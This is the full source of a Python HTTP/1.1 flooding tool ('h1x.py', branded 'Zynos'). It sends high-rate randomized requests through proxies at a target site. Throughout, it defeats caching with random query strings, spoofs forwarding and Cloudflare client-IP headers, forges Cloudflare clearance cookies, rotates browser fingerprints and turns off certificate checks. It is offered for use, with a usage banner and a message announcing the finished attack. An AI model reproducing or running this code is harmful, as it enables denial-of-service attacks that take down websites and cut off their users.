#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
HTTP/1.1 FLOODER - Python Version
Lightweight & High Performance
Multi-threaded with asyncio + proxy support
"""

import asyncio
import aiohttp
import aiohttp_socks
import random
import string
import sys
import os
import time
import socket
import ssl
import threading
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urlparse
import argparse

# ========== HEADER LISTS (Original dari h2x.js) ==========
accept_header = [
    '*/*',
    'image/*',
    'image/webp,image/apng',
    'text/html',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'
]

encoding_header = [
    '*',
    '*/*',
    'gzip',
    'gzip, deflate, br',
    'gzip, deflate',
    "gzip, deflate, br, zstd"
]

cache_header = [
    'max-age=0',
    'no-cache',
    'no-store',
    'pre-check=0',
    'post-check=0',
    'must-revalidate',
    'proxy-revalidate',
    's-maxage=604800',
    'no-cache, private',
    'max-age=300, must-revalidate',
    'no-store, max-age=0, private, must-revalidate',
    'public, max-age=10, s-maxage=10',
    'no-cache, no-store,private, max-age=0, must-revalidate',
    'no-cache, no-store,private, s-maxage=604800, must-revalidate',
    'no-cache, no-store,private, max-age=604800, must-revalidate',
]

refers = [
    "https://google.com",
    "https://check-host.net/",
    "https://www.facebook.com/",
    "https://www.youtube.com/",
    "https://www.fbi.com/",
    "https://discord.com",
    "https://www.cloudflare.com",
]

uap = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/133.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Edge/133.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:133.0) Gecko/20100101 Firefox/133.0",
]

language_header = [
    "id-ID,id;q=0.9,en;q=0.8",
    "en-US,en;q=0.9,id;q=0.8",
    "en-GB,en;q=0.9",
    "ja-JP,ja;q=0.9,en;q=0.8",
    "zh-CN,zh;q=0.9,en;q=0.8"
]

methods = ["GET", "POST"]

fetch_site = ["same-origin", "same-site", "cross-site", "none"]
fetch_mode = ["navigate", "same-origin", "no-cors", "cors"]
fetch_dest = ["document", "sharedworker", "subresource", "unknown", "worker"]

sec_ch_ua = [
    '"Google Chrome";v="133", "Chromium";v="133", "Not_A Brand";v="24"',
    '"Google Chrome";v="132", "Chromium";v="132", "Not_A Brand";v="24"',
    '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
    '"Microsoft Edge";v="133", "Chromium";v="133", "Not_A Brand";v="24"',
    '"Brave";v="133", "Chromium";v="133", "Not_A Brand";v="24"',
    '"Brave";v="149.0.0.0", "Chromium";v="149.0.0.0", "Not?A_Brand";v="24.0.0.0"',
    '"Brave";v="150.0.0.0", "Chromium";v="150.0.0.0", "Not?A_Brand";v="24.0.0.0"',
    '"Brave";v="148.0.0.0", "Chromium";v="148.0.0.0", "Not?A_Brand";v="24.0.0.0"',
    '"Google Chrome";v="130", "Chromium";v="130", "Not_A Brand";v="24"',
    '"Google Chrome";v="129", "Chromium";v="129", "Not_A Brand";v="24"',
    '"Opera";v="118", "Chromium";v="133", "Not_A Brand";v="24"'
]

sec_ch_ua_platform = ['"Windows"', '"macOS"', '"Linux"', '"Android"', '"iOS"']
sec_ch_ua_mobile = ['?0', '?1', '?0']

# ========== UTILITY FUNCTIONS ==========
def randstr(length):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def randstr_num(length):
    return ''.join(random.choices(string.digits, k=length))

def random_element(arr):
    return random.choice(arr)

def generate_random_string(min_len, max_len):
    length = random.randint(min_len, max_len)
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def load_proxies(file_path):
    try:
        with open(file_path, 'r') as f:
            lines = f.read().splitlines()
            return [line.strip() for line in lines if line.strip() and not line.startswith('#')]
    except:
        return []

# ========== ASYNC FLOODER ==========
class HTTP11Flooder:
    def __init__(self, target, time_sec, rate, threads, proxy_file):
        self.target = target
        self.parsed = urlparse(target)
        self.time_sec = time_sec
        self.rate = rate
        self.threads = threads
        self.proxy_file = proxy_file
        self.proxies = load_proxies(proxy_file)
        self.running = True
        self.stats = {
            'total': 0,
            'success': 0,
            'failed': 0
        }
        
        # SSL context
        self.ssl_context = ssl.create_default_context()
        self.ssl_context.check_hostname = False
        self.ssl_context.verify_mode = ssl.CERT_NONE
        
        # Headers template
        self.base_headers = self._generate_base_headers()
    
    def _generate_base_headers(self):
        path = (self.parsed.path or '/') + '?' + randstr(6) + '=' + generate_random_string(20, 30) + '&' + randstr(4) + '=' + generate_random_string(15, 25)
        return {
            ':method': random_element(methods),
            ':path': path,
            ':scheme': 'https',
            ':authority': self.parsed.netloc,
            'accept': random_element(accept_header),
            'accept-encoding': random_element(encoding_header),
            'accept-language': random_element(language_header),
            'cache-control': random_element(cache_header),
            'referer': random_element(refers),
            'user-agent': random_element(uap),
            'upgrade-insecure-requests': '1',
            'pragma': 'no-cache',
            'sec-fetch-mode': random_element(fetch_mode),
            'sec-fetch-site': random_element(fetch_site),
            'sec-fetch-dest': random_element(fetch_dest),
            'connection': 'keep-alive'
        }
    
    def _generate_headers(self, proxy_ip=None):
        headers = dict(self.base_headers)
        
        # Randomize path each request
        headers[':path'] = (self.parsed.path or '/') + '?' + randstr(6) + '=' + generate_random_string(20, 30) + '&' + randstr(4) + '=' + generate_random_string(15, 25)
        headers[':method'] = random_element(methods)
        
        # Spoof headers
        if proxy_ip:
            headers['X-Forwarded-For'] = proxy_ip
            headers['X-Real-IP'] = proxy_ip
            headers['cf-connecting-ip'] = proxy_ip
        
        headers['sec-ch-ua'] = random_element(sec_ch_ua)
        headers['sec-ch-ua-mobile'] = random_element(sec_ch_ua_mobile)
        headers['sec-ch-ua-platform'] = random_element(sec_ch_ua_platform)
        headers['cookie'] = f"__cf_bm={randstr(44)}.{randstr(24)}.{randstr(48)}-{int(time.time()*1000)}-0-0.0.1; cf_clearance={randstr(8)}.{randstr(24)}.{randstr(48)}-0.0.1"
        headers['dnt'] = '1'
        
        # Remove pseudo headers for aiohttp
        aio_headers = {}
        for k, v in headers.items():
            if not k.startswith(':'):
                aio_headers[k] = v
        
        return aio_headers
    
    async def _make_request(self, session, proxy=None):
        try:
            url = f"{self.parsed.scheme}://{self.parsed.netloc}{self.parsed.path or '/'}"
            headers = self._generate_headers(proxy_ip=proxy.split(':')[0] if proxy else None)
            
            # Randomize query
            if '?' in url:
                url = url.split('?')[0]
            url += '?' + randstr(6) + '=' + generate_random_string(20, 30) + '&' + randstr(4) + '=' + generate_random_string(15, 25)
            
            method = random_element(methods)
            
            async with session.request(method, url, headers=headers, ssl=self.ssl_context, timeout=aiohttp.ClientTimeout(total=5)) as resp:
                self.stats['total'] += 1
                if resp.status < 400:
                    self.stats['success'] += 1
                else:
                    self.stats['failed'] += 1
                await resp.read()
                
        except Exception:
            self.stats['failed'] += 1
            self.stats['total'] += 1
    
    async def _worker(self, worker_id):
        # Set up connector with proxy support
        connector = None
        proxy = None
        
        if self.proxies and worker_id % 2 == 0:
            proxy = random_element(self.proxies)
            try:
                proxy_parts = proxy.split(':')
                if len(proxy_parts) >= 2:
                    proxy_host, proxy_port = proxy_parts[0], int(proxy_parts[1])
                    # Use HTTP proxy
                    connector = aiohttp.TCPConnector(ssl=self.ssl_context, limit=0, ttl_dns_cache=300)
                    proxy_url = f"http://{proxy_host}:{proxy_port}"
                    connector = aiohttp.TCPConnector(ssl=self.ssl_context, limit=0)
                else:
                    connector = aiohttp.TCPConnector(ssl=self.ssl_context, limit=0)
            except:
                connector = aiohttp.TCPConnector(ssl=self.ssl_context, limit=0)
        else:
            connector = aiohttp.TCPConnector(ssl=self.ssl_context, limit=0)
        
        async with aiohttp.ClientSession(connector=connector, connector_owner=True) as session:
            # Rate limiter per worker
            rate_per_worker = max(1, self.rate // self.threads)
            
            while self.running:
                tasks = []
                for _ in range(rate_per_worker):
                    if not self.running:
                        break
                    task = asyncio.create_task(self._make_request(session, proxy))
                    tasks.append(task)
                
                if tasks:
                    await asyncio.gather(*tasks, return_exceptions=True)
                
                # Small delay to control rate
                await asyncio.sleep(0.001)
    
    async def _stats_printer(self):
        start_time = time.time()
        while self.running:
            elapsed = time.time() - start_time
            if elapsed > 0:
                rps = self.stats['total'] / elapsed
                print(f"\r\x1b[36m[*] RPS: {rps:.1f} | Total: {self.stats['total']} | Success: {self.stats['success']} | Failed: {self.stats['failed']} | Elapsed: {elapsed:.1f}s\x1b[0m", end='')
            await asyncio.sleep(0.5)
    
    async def run(self):
        # Start workers
        workers = []
        for i in range(self.threads):
            worker = asyncio.create_task(self._worker(i))
            workers.append(worker)
        
        # Start stats printer
        stats_task = asyncio.create_task(self._stats_printer())
        
        # Wait for duration
        await asyncio.sleep(self.time_sec)
        self.running = False
        
        # Wait for workers to finish
        await asyncio.gather(*workers, return_exceptions=True)
        stats_task.cancel()
        
        print("\n\x1b[32m[*] Attack completed!\x1b[0m")

# ========== SYNC WRAPPER ==========
def run_flooder_sync(target, time_sec, rate, threads, proxy_file):
    asyncio.run(HTTP11Flooder(target, time_sec, rate, threads, proxy_file).run())

# ========== MAIN ==========
if __name__ == "__main__":
    if len(sys.argv) < 6:
        print("Usage: python h1x.py <host> <time> <rate> <threads> <proxy.txt>")
        print("Example: python h1x.py https://target.com 60 1000 8 proxy.txt")
        print("\n\x1b[31m[*] Python HTTP/1.1 Flooder - Lightweight & Gacor!\x1b[0m")
        sys.exit(1)
    
    target = sys.argv[1]
    time_sec = int(sys.argv[2])
    rate = int(sys.argv[3])
    threads = int(sys.argv[4])
    proxy_file = sys.argv[5]
    
    # Display banner
    os.system('cls' if os.name == 'nt' else 'clear')
    print("\x1b[36m" + "="*45 + "\x1b[0m")
    print("\x1b[33mUser: \x1b[32mPrv\x1b[0m \x1b[36m|\x1b[0m \x1b[33mVip: \x1b[32mtrue\x1b[0m")
    print("\x1b[33mAdmin: \x1b[35mZYNOS\x1b[0m \x1b[36m|\x1b[0m \x1b[33mExpired: \x1b[31mNo\x1b[0m")
    print("\x1b[36m" + "="*45 + "\x1b[0m")
    print(f"\x1b[33mTarget: \x1b[37m{target}\x1b[0m")
    print(f"\x1b[33mTime: \x1b[37m{time_sec}s\x1b[0m")
    print(f"\x1b[33mRate: \x1b[37m{rate}/s\x1b[0m")
    print(f"\x1b[33mThreads: \x1b[37m{threads}\x1b[0m")
    print(f"\x1b[33mProxy: \x1b[37m{proxy_file}\x1b[0m")
    print("\x1b[36m" + "="*45 + "\x1b[0m")
    print("\x1b[35mZynos Python Flooder 2025-2026 | t.me/zynos_official\x1b[0m")
    print("\x1b[36m" + "="*45 + "\x1b[0m")
    
    # Run flooder
    try:
        run_flooder_sync(target, time_sec, rate, threads, proxy_file)
    except KeyboardInterrupt:
        print("\n\x1b[31m[*] Stopped by user\x1b[0m")
    except Exception as e:
        print(f"\n\x1b[31m[*] Error: {e}\x1b[0m")